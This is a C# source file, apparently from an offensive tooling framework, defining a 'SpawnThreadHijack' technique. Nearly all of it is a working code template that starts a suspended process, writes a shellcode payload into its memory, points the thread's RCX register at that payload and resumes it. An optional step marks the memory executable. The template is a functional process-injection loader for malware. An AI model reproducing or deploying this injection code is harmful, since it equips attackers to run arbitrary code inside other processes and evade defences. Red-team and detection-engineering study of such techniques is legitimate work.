using System.Collections.Generic;

namespace SingleDose.Techniques.Injects
{
    internal class SpawnThreadHijack : ITechnique
    {
        string ITechnique.TechniqueName => "SpawnThreadHijack";

        string ITechnique.TechniqueDescription => "Spawns a suspended sacrificial process, writes shellcode to the targetthen sets the RCX register which will trigger shellcode execution whenthe process is resumed.";

        List<string> ITechnique.TechniqueReferences => new List<string>() 
        {
            @""
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => false;
        List<string> ITechnique.Invokes => new List<string>() { "CreateProcess", "VirtualAllocEx", "WriteProcessMemory_ByteArray", "GetThreadContext", "SetThreadContext",
            "ResumeThread", "CloseHandle" };
        List<string> ITechnique.Prerequisites => new List<string>() { "SpawnProcess" };
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            bool bvRet = false;
            STARTUPINFO sSI = new STARTUPINFO();
            PROCESS_INFORMATION sPI = new PROCESS_INFORMATION();
            bvRet = CreateProcess({{SPAWNPROCESS}}, String.Empty, IntPtr.Zero, IntPtr.Zero,
                false, 0x4 /*Suspended*/, IntPtr.Zero, Directory.GetCurrentDirectory(), ref sSI, out sPI);
            if (!bvRet)
            {
                Console.WriteLine(""CreateProcess failed. Exiting..."");
                System.Environment.Exit(1);
            }

            IntPtr hAlloc = VirtualAllocEx(sPI.hProcess, IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});

            if (hAlloc == IntPtr.Zero)
            {
                Console.WriteLine(""VirtualAllocEx: failed to alloc in process. Exiting..."");
                System.Environment.Exit(1);
            }

            IntPtr NumRead = IntPtr.Zero;
            WriteProcessMemory(sPI.hProcess, hAlloc, payload, (uint)payload.Length, out NumRead);
            if (NumRead == IntPtr.Zero)
            {
                Console.WriteLine(""WriteProcessMemory: failed to write to process. Exiting..."");
                System.Environment.Exit(1);
            }
            {{PROTECT}}
            CONTEXT64 sC64 = new CONTEXT64();
            sC64.ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL;
            IntPtr psC64 = Marshal.AllocHGlobal(Marshal.SizeOf(sC64));
            Marshal.StructureToPtr(sC64, psC64, false);
            bvRet = GetThreadContext(sPI.hThread, psC64);
            if (!bvRet)
            {
                Console.WriteLine(""GetThreadContext: failed to get CONTEXT. Exiting..."");
                System.Environment.Exit(1);
            }

            sC64 = (CONTEXT64)Marshal.PtrToStructure(psC64, typeof(CONTEXT64));
            sC64.Rcx = (ulong)hAlloc.ToInt64();
            Marshal.StructureToPtr(sC64, psC64, false);
            bvRet = SetThreadContext(sPI.hThread, psC64);
            if (!bvRet)
            {
                Console.WriteLine(""SetThreadContext: failed to set CONTEXT. Exiting..."");
                System.Environment.Exit(1);
            }

            ResumeThread(sPI.hThread);
            CloseHandle(sPI.hThread);
            CloseHandle(sPI.hProcess);
        }
        {{ARGS}}
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format(""High:{0}, Low:{1}"", this.High, this.Low);
            }
        }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }
        {{INVOKE}}
    }
}";
        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(sPI.hProcess, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
